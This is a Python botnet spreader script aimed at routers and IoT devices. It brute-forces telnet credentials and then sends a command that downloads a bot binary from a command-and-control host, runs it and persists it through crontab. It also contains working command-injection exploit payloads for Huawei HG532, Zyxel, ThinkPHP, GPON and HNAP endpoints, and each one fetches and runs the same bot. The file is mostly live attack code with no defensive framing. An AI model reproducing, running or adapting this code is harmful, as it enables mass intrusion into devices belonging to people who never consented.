#!/usr/bin/env python3
import socket
import time
import threading
import os
import sys
import json
import requests

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
WORDLIST_PATH = os.path.join(SCRIPT_DIR, 'wordlist.txt')
IP_LIST_PATH = os.path.join(SCRIPT_DIR, 'ip-list.txt')
HITS_PATH = os.path.join(SCRIPT_DIR, 'hits.txt')
SCAN_RESULTS_PATH = os.path.join(SCRIPT_DIR, '..', 'infector', 'scan_results.txt')

C2_HOST = "0.0.0.0"
C2_PORT = 9001
TIMEOUT = 2.0
THREADS = 1000

_config_path = os.path.join(SCRIPT_DIR, '..', '..', 'src', 'config.json')
try:
    with open(_config_path, 'r') as f:
        _cfg = json.load(f)
    C2_HOST = _cfg.get('public_host', C2_HOST)
    C2_PORT = int(_cfg.get('public_port', C2_PORT))
except Exception:
    pass

passwords_tried = 0
brute_success = 0
brute_failed = 0

lock = threading.Lock()
display_lock = threading.Lock()
stats_lock = threading.Lock()
found = []
last_display = {}
DISPLAY_INTERVAL = 0.5

os.makedirs(os.path.dirname(SCAN_RESULTS_PATH), exist_ok=True)
os.makedirs(os.path.dirname(HITS_PATH), exist_ok=True)

def load_wordlist(path):
    creds = []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if ':' in line:
                    user, password = line.split(':', 1)
                    creds.append((user, password))
                else:
                    creds.append((line, line))
    except Exception as e:
        print(f"[!] Failed to load wordlist: {e}")
    return creds

def load_ip_list(path):
    entries = []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split(':')
                ip = parts[0]
                if len(parts) > 1:
                    try:
                        port = int(parts[1])
                    except ValueError:
                        port = 23
                else:
                    port = 23
                entries.append((ip, port))
    except Exception as e:
        print(f"[!] Failed to load ip list: {e}")
    return entries

def try_login(ip, port, username, password):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, port))
        banner = b''
        try:
            s.settimeout(0.8)
            banner = s.recv(256)
        except Exception:
            pass
        banner_text = banner.decode('utf-8', errors='ignore').lower()
        if 'login:' not in banner_text and 'username:' not in banner_text and 'user:' not in banner_text:
            s.close()
            return False
        s.sendall((username + '\r\n').encode('utf-8', errors='ignore'))
        time.sleep(0.2)
        s.sendall((password + '\r\n').encode('utf-8', errors='ignore'))
        time.sleep(0.35)
        response = b''
        try:
            s.settimeout(1.5)
            response = s.recv(1024)
        except Exception:
            pass
        response_text = response.decode('utf-8', errors='ignore').lower()
        failure_signals = ['incorrect', 'failed', 'failure', 'invalid', 'denied', 'wrong']
        if any(signal in response_text for signal in failure_signals):
            s.close()
            return False
        if 'login:' in response_text or 'password:' in response_text:
            s.close()
            return False
        success_signals = ['#', '$', '>', 'busybox', 'shell', 'welcome', '~ #', '/ #']
        if any(signal in response_text for signal in success_signals):
            s.close()
            return True
        if len(response_text.strip()) == 0 and len(banner_text.strip()) > 0:
            s.close()
            return True
        s.close()
        return False
    except Exception:
        return False

def save_success(ip, port, username, password, exploit_type="bruteforce"):
    """Save a successful result to hits and scan_results.txt.
    Format: ip:port:exploit (3 parts) or ip:port:user:pass (4 parts)."""
    exp_map = {
        "huawei_exploit": "huawei",
        "zyxel_exploit": "zyxel",
        "thinkphp_exploit": "thinkphp",
        "gpon80_exploit": "gpon80",
        "hnap_exploit": "hnap",
    }

    with lock:
        if exploit_type in ("bruteforce", "deployed"):
            entry = f"{ip}:{port}:{username}:{password}\n"
        elif username in exp_map:
            entry = f"{ip}:{port}:{exp_map[username]}\n"
        else:
            entry = f"{ip}:{port}:{username}\n"

        found.append(entry)

        try:
            with open(HITS_PATH, 'a', encoding='utf-8') as f:
                f.write(entry)
        except Exception:
            pass

        try:
            with open(SCAN_RESULTS_PATH, 'a', encoding='utf-8') as f:
                f.write(entry)
        except Exception:
            pass

def deploy_agent(ip, port, username, password):
    if not C2_HOST:
        return False
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, port))
        banner = b''
        try:
            s.settimeout(0.8)
            banner = s.recv(256)
        except Exception:
            pass
        banner_text = banner.decode('utf-8', errors='ignore').lower()
        if 'login:' not in banner_text and 'username:' not in banner_text and 'user:' not in banner_text:
            s.sendall(b'\r\n')
            time.sleep(0.3)
            try:
                s.settimeout(0.8)
                banner = s.recv(256)
                banner_text = banner.decode('utf-8', errors='ignore').lower()
            except Exception:
                pass
        if 'login:' not in banner_text and 'username:' not in banner_text and 'user:' not in banner_text:
            s.close()
            return False
        s.sendall((username + '\r\n').encode('utf-8', errors='ignore'))
        time.sleep(0.2)
        s.sendall((password + '\r\n').encode('utf-8', errors='ignore'))
        time.sleep(0.3)
        response = b''
        try:
            s.settimeout(1.5)
            response = s.recv(1024)
        except Exception:
            pass
        response_text = response.decode('utf-8', errors='ignore').lower()
        failure_signals = ['incorrect', 'failed', 'failure', 'invalid', 'denied', 'wrong']
        if any(signal in response_text for signal in failure_signals):
            s.close()
            return False
        deploy_cmd = (
            f"nohup sh -c 'wget -q http://{C2_HOST}:{C2_PORT}/agent/mipsle -O /tmp/.joker_bot 2>/dev/null || "
            f"curl -s http://{C2_HOST}:{C2_PORT}/agent/mipsle -o /tmp/.joker_bot 2>/dev/null; "
            f"chmod 777 /tmp/.joker_bot; "
            f"(crontab -l 2>/dev/null; echo '@reboot /tmp/.joker_bot {C2_HOST} {C2_PORT} --install &') | crontab -; "
            f"nohup /tmp/.joker_bot {C2_HOST} {C2_PORT} --install --cascade >/dev/null 2>&1 &' &\r\n"
        )
        s.sendall(deploy_cmd.encode('utf-8', errors='ignore'))
        time.sleep(3)
        s.close()
        return True
    except Exception:
        return False

def try_huawei_exploit(ip, c2_host, c2_port):
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(1)
        conn.connect((ip, 37215))
        payload = (
            "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n"
            "Content-Length: 430\r\n"
            "Connection: keep-alive\r\n"
            "Accept: */*\r\n"
            "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", "
            "nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", "
            "response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n"
            "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
            "<s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">"
            f"<NewStatusURL>$(/bin/busybox wget -g {c2_host} -l /tmp/.bot -r /mipsle; /bin/busybox chmod 777 /tmp/.bot; /tmp/.bot mipsle)</NewStatusURL>"
            "<NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n"
        )
        conn.settimeout(1)
        conn.sendall(payload.encode('utf-8', errors='ignore'))
        time.sleep(0.5)
        conn.close()
        return True
    except Exception:
        return False

def try_zyxel_exploit(ip, c2_host, c2_port):
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(1)
        conn.connect((ip, 8080))
        payload = (
            "POST /cgi-bin/ViewLog.asc HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            "Connection: keep-alive\r\n"
            "Accept: */*\r\n"
            "User-Agent: python-requests/2.20.0\r\n"
            "Content-Length: 227\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
            f" /bin/busybox wget http://{c2_host}:{c2_port}/agent/mipsle -O /tmp/.bot; chmod 777 /tmp/.bot; /tmp/.bot {c2_host} {c2_port} &\r\n"
        )
        conn.settimeout(1)
        conn.sendall(payload.encode('utf-8', errors='ignore'))
        time.sleep(0.5)
        conn.close()
        return True
    except Exception:
        return False

def try_thinkphp_exploit(ip, c2_host, c2_port):
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(1)
        conn.connect((ip, 80))
        payload = (
            "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec"
            f"&vars[1][]='wget http://{c2_host}:{c2_port}/agent/mipsle -O /tmp/.bot && chmod 777 /tmp/.bot && /tmp/.bot {c2_host} {c2_port} &'"
            " HTTP/1.1\r\n"
            "Connection: keep-alive\r\n"
            "Accept: */*\r\n"
            "User-Agent: Uirusu/2.0\r\n\r\n"
        )
        conn.settimeout(1)
        conn.sendall(payload.encode('utf-8', errors='ignore'))
        time.sleep(0.5)
        conn.close()
        return True
    except Exception:
        return False

def try_gpon80_exploit(ip, c2_host, c2_port):
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(1)
        conn.connect((ip, 80))
        shell_cmd = f"cd+/tmp;wget+http://{C2_HOST}:{C2_PORT}/agent/mipsle+-O+/tmp/.joker_bot;chmod+777+/tmp/.joker_bot;nohup+/tmp/.joker_bot+{C2_HOST}+{C2_PORT}+--install+--cascade+>/dev/null+2>&1+&"
        payload = (
            "GET /GponForm/diag_Form?script/%3C%25+echo+shell_exec%28"
            f"\"{shell_cmd}\"%29+--%3E&port=80&host=google.com HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            "User-Agent: Mozilla/5.0\r\n\r\n"
        )
        conn.settimeout(1)
        conn.sendall(payload.encode('utf-8', errors='ignore'))
        time.sleep(0.5)
        conn.close()
        return True
    except Exception:
        return False

def try_hnap_exploit(ip, c2_host, c2_port):
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(1)
        conn.connect((ip, 80))
        payload = (
            "POST /HNAP1 HTTP/1.1\r\n"
            f"Host: {ip}\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Content-Type: text/xml; charset=utf-8\r\n"
            "Content-Length: 700\r\n"
            'SOAPAction: "http://hapextern/SetupWANIPConnection"\r\n\r\n'
            '<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
            '<s:Body><u:AddAnyPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">'
            f"<NewStatusURL>$(cd /tmp; wget http://{c2_host}:{c2_port}/agent/mipsle -O /tmp/.bot; chmod 777 /tmp/.bot; "
            f"nohup /tmp/.bot {c2_host} {c2_port} --install --cascade &gt;/dev/null 2>&1 &)</NewStatusURL>"
            "<NewExternalPort>1</NewExternalPort><NewProtocol>TCP</NewProtocol>"
            "<NewInternalPort>1</NewInternalPort><NewInternalClient>0.0.0.0</NewInternalClient>"
            "</u:AddAnyPortMapping></s:Body></s:Envelope>\r\n\r\n"
        )
        conn.settimeout(1)
        conn.sendall(payload.encode('utf-8', errors='ignore'))
        time.sleep(0.5)
        conn.close()
        return True
    except Exception:
        return False

def worker_bruteforce(ip, port, creds):
    global passwords_tried, brute_success, brute_failed
    total = len(creds)
    key = f"{ip}:{port}"
    for i, (username, password) in enumerate(creds, 1):
        now = time.time()
        if now - last_display.get(key, 0) >= DISPLAY_INTERVAL:
            with display_lock:
                print(f"[*] Attempting bruteforce on {ip}:{port} {username}:{password} ({i}/{total})")
                last_display[key] = now
        with stats_lock:
            passwords_tried += 1
        if try_login(ip, port, username, password):
            with lock:
                print(f"[+] BRUTE SUCCESS {ip}:{port} {username}:{password}")
            with stats_lock:
                brute_success += 1
            save_success(ip, port, username, password, "bruteforce")
            if C2_HOST:
                deployed = deploy_agent(ip, port, username, password)
                if deployed:
                    with lock:
                        print(f"[+] DEPLOYED agent to {ip}:{port}")
                    save_success(ip, port, username, password, "deployed")
            break
        else:
            with stats_lock:
                brute_failed += 1
    else:
        with lock:
            print(f"[-] Exhausted {total} credentials on {ip}:{port}")

def worker_exploit(ip, port, c2_host, c2_port):
    if port == 37215:
        if try_huawei_exploit(ip, c2_host, c2_port):
            print(f"[+] HUAWEI EXPLOIT sent to {ip}:{port}")
            save_success(ip, port, "huawei_exploit", "n/a", "exploit")
    elif port == 8080:
        if try_zyxel_exploit(ip, c2_host, c2_port):
            print(f"[+] ZYXEL EXPLOIT sent to {ip}:{port}")
            save_success(ip, port, "zyxel_exploit", "n/a", "exploit")
    elif port == 80:
        if try_thinkphp_exploit(ip, c2_host, c2_port):
            print(f"[+] THINKPHP EXPLOIT sent to {ip}:{port}")
            save_success(ip, port, "thinkphp_exploit", "n/a", "exploit")
        if try_gpon80_exploit(ip, c2_host, c2_port):
            print(f"[+] GPON80 EXPLOIT sent to {ip}:{port}")
            save_success(ip, port, "gpon80_exploit", "n/a", "exploit")
        if try_hnap_exploit(ip, c2_host, c2_port):
            print(f"[+] HNAP EXPLOIT sent to {ip}:{port}")
            save_success(ip, port, "hnap_exploit", "n/a", "exploit")

def main():
    global found
    entries = load_ip_list(IP_LIST_PATH)
    creds = load_wordlist(WORDLIST_PATH)

    if not entries:
        print("[!] No IPs loaded from ip-list.txt")
        return
    if not creds:
        print("[!] No credentials loaded from wordlist.txt")
        return

    print(f"[*] Loaded {len(entries)} targets and {len(creds)} credentials")
    print(f"[*] C2 host: {C2_HOST or 'not set - deploy disabled'}")
    print(f"[*] Starting with {THREADS} threads...")

    threads = []
    for ip, port in entries:
        if port in (23, 2323):
            t = threading.Thread(target=worker_bruteforce, args=(ip, port, creds), daemon=True)
        else:
            t = threading.Thread(target=worker_exploit, args=(ip, port, C2_HOST, C2_PORT), daemon=True)
        t.start()
        threads.append(t)
        while len(threads) >= THREADS:
            for t in threads[:]:
                if not t.is_alive():
                    threads.remove(t)
            time.sleep(0.1)

    for t in threads:
        t.join()

    print(f"\n[+] Done. Successes: {len(found)}")
    print(f"\n[BRUTEFORCER] Password Tried: {passwords_tried}")
    print(f"[BRUTEFORCER] Success: {brute_success}")
    print(f"[BRUTEFORCER] Failed: {brute_failed}")
    if found:
        print(f"[+] Saved to {HITS_PATH}")
    input("\n[BRUTEFORCER] Press Enter to exit...")

if __name__ == '__main__':
    main()
